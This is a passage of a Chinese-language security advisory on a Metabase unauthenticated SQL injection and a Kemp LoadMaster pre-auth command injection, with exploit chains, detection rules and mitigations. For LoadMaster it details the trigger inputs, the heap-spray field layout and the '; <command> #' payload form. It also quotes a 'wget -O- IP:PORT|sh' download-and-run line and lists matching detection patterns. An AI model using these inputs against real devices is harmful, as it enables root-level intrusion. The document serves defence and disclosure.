#### 3.1.2 漏洞摘要

该漏洞存在于 Metabase 密码重置接口 `/api/session/reset_password`。Metabase 是一款开源商业智能（BI）与数据分析平台，通常直连企业数据仓库。官方通告确认：**未认证远程攻击者可通过该接口向 Metabase 应用数据库注入任意 SQL**，从而获得实例管理员权限；此后攻击者可修改应用配置、窃取所有已连接数据库的存储凭据、读取这些连接可达的数据并导出。对企业而言，BI 平台直连核心数仓，爆破半径接近最坏情况。

该漏洞以**真实零日**形态被利用：攻击者在 Metabase 自身发现之前已将其用于攻击 Metabase Cloud，官方在通告中确认"利用的是 1.58 及以上版本中未知（0-day）漏洞"，随即封禁被滥用端点并完成修复；公告发布时 Cloud 实例已全部运行修复版本。**自托管实例需自行升级**。实际受害者包括：PC 厂商 Framework（姓名、邮箱、登录 IP、账单/收货地址、电话号码、公司名称泄露，订单与支付信息未受影响）与 Tally（邮箱与密码哈希被访问，表单与响应数据因位于独立系统未受影响）；LexisNexis 主动断开了与 Metabase 的集成（是否泄露未确认）。官方同时公布了中招特征：日志中出现"`POST /api/session/reset_password` 返回 400，随后 `GET /api/user/current` 返回 200"的序列，即视为实例已被攻破。

> 官方通告建议：自托管实例尽快升级至对应安全版本；无法立即升级的临时缓解措施为在网络层阻断 `/api/session/reset_password` 端点；若该端点曾公网可达，升级后还须清除会话、审计 API Key 与管理员账户、轮换连接库凭据并检查数仓日志。

#### 3.1.5 利用条件与技术原理

| 条件 | 状态 | 说明 |
| --- | --- | --- |
| 网络可达 | 是 | 攻击者需可达 Metabase HTTP API（密码重置接口公网暴露） |
| 身份认证 | 无需 | 未认证触发（PR:N） |
| 用户交互 | 不需要 | 全程无用户参与 |
| 特定配置 | 是 | 默认配置即受影响；应用数据库中存储的高权限连接库凭据会放大影响范围 |
| 利用复杂度 | 低 | NVD 向量 AC:L（官方评分为 10.0） |

**技术原理：**

密码重置接口 `/api/session/reset_password` 在处理输入并构造 SQL 语句时缺乏参数化处理与输入校验，未认证攻击者可向该接口提交精心构造的请求，将任意 SQL 注入 Metabase 应用数据库（元数据库）。注入成功后攻击者可直接在应用数据库中提升/创建管理员上下文，随后以管理员身份调用管理功能：枚举并窃取各连接数据库的存储凭据、查询并导出数据、修改应用配置或账户以维持访问。

**核心利用链：**

```text
攻击者
  └─ 发现互联网暴露的 Metabase 实例（0.58~0.63 受影响分支）
      └─ 向 /api/session/reset_password 发送构造的 POST 请求（注入 SQL）
          └─ 任意 SQL 在 Metabase 应用数据库中执行
              └─ 获取实例管理员权限（GET /api/user/current 返回 200 验证）
                  └─ 枚举并窃取已连接数据库的存储凭据
                      └─ 查询/导出业务数据，修改配置或创建后门账户维持访问
```

#### 3.2.2 漏洞摘要

该漏洞位于 Progress ADC（Kemp LoadMaster）负载均衡设备的管理 API 中，属于 **OS 命令注入导致的预认证远程代码执行**。LoadMaster 是部署于企业边界、负责应用交付与负载均衡的硬件/虚拟化设备，其管理 API 的多个命令端点对输入缺乏充分过滤（根因为 `escape_quotes()` 处理特殊引号输入时存在缺陷，watchtowr 将其描述为"未初始化堆到预认证 RCE"）。未认证攻击者可构造单个请求（`POST /accessv2`），利用 `apiuser="''''"` 触发引号转义缺陷，配合 `g0~g60` 共 61 次堆喷射将命令载荷布局到相邻堆块，最终由 `system()` **以 root 权限**执行任意系统命令。

时间线：2026-06-04 厂商披露并发布修复版本；2026-06-29 eSentire 威胁响应团队（TRU）观测到在野利用尝试（同日公开功能 PoC 与技术细节）；2026-08-08 被 CISA 纳入 [KEV 目录](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)，要求联邦机构于 2026-08-10 前修复。这是继 CVE-2024-1212（CVSS 10.0，同为命令注入）之后第二个遭在野利用的 LoadMaster 命令注入漏洞。

> eSentire 建议组织立即应用相关安全补丁，并提示公开 PoC 与技术细节可能推动利用活动进一步增加；CISA 亦敦促私有机构核查 KEV 目录并处置相关资产。

#### 3.2.5 利用条件与技术原理

| 条件 | 状态 | 说明 |
| --- | --- | --- |
| 网络可达 | 是 | 攻击者需可达 LoadMaster 管理 API（`POST /accessv2`，通常位于 443 端口） |
| 身份认证 | 无需 | 预认证触发（PR:N） |
| 用户交互 | 不需要 | 全程无用户参与 |
| 特定配置 | 是 | 需启用 API 功能；管理接口暴露于攻击者可达网络 |
| 利用复杂度 | 低 | NVD 向量 AC:L |

**技术原理：**

管理 API 的命令端点将用户可控输入拼接进系统命令，且引号过滤函数 `escape_quotes()` 对连续引号输入（如 `''''`）的处理存在缺陷（未正确 null 终止，对应未初始化堆内存问题）：攻击者以 `"apiuser": "''''"` 触发该缺陷绕过转义，随后在请求 JSON 中填充 `g0`~`g60` 共 61 个字段进行堆喷射，将 `'; <命令> #` 形式的载荷布局到相邻堆块（`#` 注释掉后续内容），最终该串被传入 `system()` 以 root 权限执行。命令长度受限（不带 echo 标签时约 34 字符），公开 PoC 使用 `wget -O- IP:PORT|sh` 等短载荷完成下载执行与反弹 Shell。利用成功后可完全控制负载均衡设备，进而劫持其代理的南北向流量。

**核心利用链：**

```text
攻击者
  └─ 发现暴露的 LoadMaster 管理 API（POST /accessv2）
      └─ apiuser="''''" 触发 escape_quotes() 引号转义缺陷（未 null 终止）
          └─ g0~g60 共 61 次堆喷射布局载荷
              └─ '; <命令> # 闭合上下文并注释后续
                  └─ system() 以 root 权限执行任意命令
                      └─ 下载执行载荷 / 反弹 Shell / 植入持久化后门
```

#### 资产排查

- [ ] 是否已安装官方修复版本（GA 7.2.63.2 / LTSF 7.2.54.18）

#### 日志与行为排查

重点检查：

- 管理 API（`/accessv2`）的异常 POST 请求；
- 请求体中 `apiuser` 为连续引号（`''''`）、大量 `g0~g60` 字段或命令特征（`;`、`#`、`wget`、`sh`、`bash` 等）；
- 设备上异常的进程执行、反弹连接与出站下载行为；
- 管理账户、配置与证书的异常变更；
- 设备对管理网段之外来源的认证失败记录。

| 检测项 | 可疑特征 |
| --- | --- |
| 请求路径 | `/accessv2`（管理 API 命令端点） |
| 请求方法 | 异常 POST |
| 参数特征 | `apiuser=''''`、`g0`~`g60` 大量字段、`'; <命令> #` 载荷、`wget\|sh` 短命令 |

| 文件行为 | 设备文件系统写入可疑脚本或后门文件 |

#### 3.2.11 风险影响

漏洞成功利用后，可能导致：

- 以 root 权限远程执行任意系统命令，完全控制负载均衡设备；
- 劫持、篡改或中断设备代理的应用流量（南北向流量全量可见）；
- 窃取设备上的证书、凭据与配置信息；
- 植入后门、WebShell 或持久化恶意程序；
- 以设备为跳板横向移动至后端应用服务器与内网；
- 设备被用于发起进一步攻击或形成代理跳板；
- 造成核心业务应用交付中断（DoS）。

| 无需认证利用 | 是（PR:N） |
| 利用复杂度低 | 是（AC:L，单请求触发） |

| 已确认在野利用 | 是（eSentire 自 2026-06-29 观测到利用尝试） |
| 已纳入CISA KEV | 是（2026-08-08，联邦机构截止 2026-08-10） |

#### 3.2.13 修复与缓解措施

#### 官方修复

1. 将 LoadMaster 升级至 `GA v7.2.63.2` 或 `LTSF v7.2.54.18` 及以上版本（[Progress 官方公告](https://community.progress.com/s/article/LoadMaster-Critical-Security-Bulletin-June-2026-CVE-2026-8037-CVE-2026-33691)）；
2. 升级前备份设备配置并规划变更窗口（负载均衡设备升级需评估业务连续性）；
3. 在测试环境验证配置兼容性及回退方案；
4. 升级后核验固件版本与业务流量状态。

#### 临时缓解

无法立即升级时，可采取：

- **限制管理 API 网络暴露**：通过防火墙/ACL/安全组仅允许管理网段与可信 IP 访问管理端口（443/8443）；
- 关闭不必要的外部管理访问，管理操作走带外管理网络或 VPN；
- 在 WAF/IPS/网关增加对 `/accessv2` 请求体中 `''''`、`g0~g60`、命令特征（`;`、`#`、`wget|sh`）的拦截规则；
- 启用并加强设备审计日志与异常外联监控；
- 对已疑似失陷设备按事件响应流程处置（隔离、取证、重装固件）。
